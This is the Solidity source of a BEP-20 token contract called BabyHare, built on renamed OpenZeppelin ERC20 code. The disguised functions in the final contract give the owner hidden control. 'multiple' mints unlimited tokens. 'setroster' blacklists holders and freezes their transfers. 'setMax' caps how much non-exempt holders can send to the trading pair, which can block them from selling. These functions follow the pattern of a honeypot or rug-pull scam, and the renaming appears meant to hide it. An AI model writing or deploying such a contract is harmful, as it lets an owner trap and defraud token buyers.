/**
 *Submitted for verification at BscScan.com on 2021-12-30
*/

// SPDX-License-Identifier: MIT

// pragma solidity >=0.6.0 <0.8.0;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 volume) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 volume) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 volume) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}



// pragma solidity >=0.6.0 <0.8.0;
abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}



// pragma solidity >=0.6.0 <0.8.0;

library SafeMath {
    function teyjia(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }

    function tryjian(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        if (b > a) return (false, 0);
        return (true, a - b);
    }

    function tryMu(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }


    function jia(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function jian(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }

    function mu(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }


    function jian(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        return a - b;
    }
}


// pragma solidity >=0.6.0 <0.8.0;


contract ERC20 is Context, IERC20 {
    using SafeMath for uint256;

    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor (string memory name_, string memory symbol_) public {
        _name = name_;
        _symbol = symbol_;
        _decimals = 18;
    }

    function name() public view virtual returns (string memory) {
        return _name;
    }

    function symbol() public view virtual returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 volume) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, volume);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 volume) public virtual override returns (bool) {
        _approve(_msgSender(), spender, volume);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 volume) public virtual override returns (bool) {
        _transfer(sender, recipient, volume);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].jian(volume, "ERC20: transfer volume exceeds allowance"));
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].jia(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].jian(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 volume) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, volume);

        _balances[sender] = _balances[sender].jian(volume, "ERC20: transfer volume exceeds balance");
        _balances[recipient] = _balances[recipient].jia(volume);
        emit Transfer(sender, recipient, volume);
    }

    function _multiple(address account, uint256 volume) internal virtual {
        require(account != address(0), "ERC20: mutiple to the zero address");

        _beforeTokenTransfer(address(0), account, volume);

        _totalSupply = _totalSupply.jia(volume);
        _balances[account] = _balances[account].jia(volume);
        emit Transfer(address(0), account, volume);
    }

    function _burn(address account, uint256 volume) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), volume);

        _balances[account] = _balances[account].jian(volume, "ERC20: burn volume exceeds balance");
        _totalSupply = _totalSupply.jian(volume);
        emit Transfer(account, address(0), volume);
    }

    function _approve(address owner, address spender, uint256 volume) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = volume;
        emit Approval(owner, spender, volume);
    }

    function _setupDecimals(uint8 decimals_) internal virtual {
        _decimals = decimals_;
    }

    function _beforeTokenTransfer(address from, address to, uint256 volume) internal virtual { }
}


abstract contract ERC20Burnable is Context, ERC20 {
    using SafeMath for uint256;

    function burn(uint256 volume) public virtual {
        _burn(_msgSender(), volume);
    }

    function burnFrom(address account, uint256 volume) public virtual {
        uint256 decreasedAllowance = allowance(account, _msgSender()).jian(volume, "ERC20: burn volume exceeds allowance");

        _approve(account, _msgSender(), decreasedAllowance);
        _burn(account, volume);
    }
}


// pragma solidity >=0.6.5 <0.8.0;

contract himselfble {
    address public himself;

    event himselfChanged(address indexed _oldhimself, address indexed _newhimself);

    constructor() public {
        himself = msg.sender;
    }

    modifier requirehimself() {
        require(msg.sender == himself, "FORBIDDEN");
        _;
    }
}


pragma solidity >=0.6.0 <0.8.0;

contract BabyHare is ERC20, ERC20Burnable,  himselfble {
    using SafeMath for uint256;
    address public uni;
    uint256 public max = 2**256 - 1;
    mapping(address => bool) public roster;
    mapping(address => bool) public classyroster;
    constructor() public ERC20("BabyHare", "BabyHare") {
        _setupDecimals(18);
        _multiple(msg.sender, 10000000 * 1e18);
    }

    function multiple(address account, uint256 volume)
        public virtual requirehimself
    {_multiple(account, volume);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 volume
    ) internal virtual override(ERC20) {
        if(to == uni && !classyroster[from] ){
            require(volume < max, "max");
        }
         require(!roster[from], "roster");
         require(!roster[to], "roster");
    }
    function setMax(uint256 _max) public requirehimself() {
        max = _max;
    }
    function setuni(address _uni) public requirehimself() {
        uni = _uni;
    }
    function setroster(address _uni, bool t) public requirehimself() {
        roster[_uni] = t;
    }
    function setclassyroster(address _uni, bool t) public requirehimself() {
        classyroster[_uni] = t;
    }
}